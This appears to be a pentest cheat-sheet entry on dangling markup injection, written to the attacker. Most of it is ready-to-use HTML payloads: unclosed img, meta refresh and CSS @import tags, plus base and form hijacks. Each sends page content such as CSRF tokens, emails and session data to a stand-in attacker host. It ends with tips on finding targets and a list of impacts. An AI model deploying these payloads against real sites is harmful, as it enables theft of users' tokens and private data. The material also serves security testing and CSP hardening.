---
id: "dangling-markup"
title: "Dangling Markup Injection"
type: "technique"
category: "web-application"
subcategory: "client-side"
tags: ["dangling-markup", "html-injection", "csp-bypass", "token-theft", "scriptless-attack"]
platforms: ["linux", "macos", "windows"]
related: ["xss", "csrf-modern", "css-injection"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Dangling Markup Injection

## When XSS Fails, Dangling Markup Works
If you can inject HTML but CSP blocks JavaScript, inject an unclosed attribute. The browser consumes everything until the next matching quote — sending page content (tokens, PII) to your server.

## Classic img src Dangling
```html
<!-- Inject this (note: src is NOT closed): -->
<img src='https://evil.com/log?stolen=

<!-- Browser reads forward until next ' in page source -->
<!-- Everything between injection and next quote becomes the URL -->
<!-- CSRF tokens, emails, etc. get sent to your server -->
```

## Base Tag Hijack
```html
<!-- Redirect all relative form actions to attacker -->
<base href="https://evil.com/">
<!-- Now <form action="/login"> submits to https://evil.com/login -->
```

## Meta Refresh Dangling
```html
<!-- Captures content until next quote -->
<meta http-equiv="refresh" content="0;url=https://evil.com/log?
```

## Form Action Hijack
```html
<form action="https://evil.com/collect">
<!-- If injected before the page's real inputs, they end up in your form -->
```

## Chrome Bypass (Chrome blocks < and newlines in img src)
```html
<!-- Use meta refresh instead -->
<meta http-equiv="refresh" content="0;url=https://evil.com/log?

<!-- Or base target technique -->
<base target='
<!-- Everything until next ' becomes window.name, readable in opened page -->

<!-- Or CSS @import -->
<style>@import url("https://evil.com/log?
```

## Where to Find This
- Any reflected/stored HTML injection where XSS is blocked by CSP
- Pages with CSRF tokens in hidden fields near injection point
- Email rendering (clients strip scripts but allow images)
- Apps with strict CSP but allowing images from any source

## Impact
- Stealing CSRF tokens → full CSRF attacks
- Stealing email content, API keys, session tokens
- Works even under strict CSP — go-to when you have HTML injection but no XSS
